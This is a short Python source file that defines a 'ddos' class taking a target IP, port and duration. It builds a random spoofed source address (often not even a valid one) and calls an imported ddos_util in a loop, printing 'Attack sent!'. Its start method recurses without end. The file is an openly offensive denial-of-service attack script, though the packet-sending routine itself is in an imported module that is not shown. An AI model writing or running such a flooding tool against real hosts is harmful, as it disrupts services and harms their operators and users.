import random
from .utilities.ddos_utils import *

class ddos:
    def __init__(self, IP, PORT, duration):
        ip1 = random.randint(100, 999)
        ip2 = random.randint(10, 999)
        ip3 = random.randint(10, 999)
        ip4 = random.randint(10, 999)
        fake_ip = f"{ip1}.{ip2}.{ip3}.{ip4}"
        self.fake_ip = fake_ip
        self.duration = duration
        self.IP = IP
        self.PORT = PORT
    
    
    def start(self):
        IP = self.IP
        PORT = self.PORT
        duration = self.duration
        fake_ip = self.fake_ip
        for i in range(duration):
            ddos_util(IP=IP, PORT=PORT, fake_ip=fake_ip)
            print("Attack sent!")
        self.start()
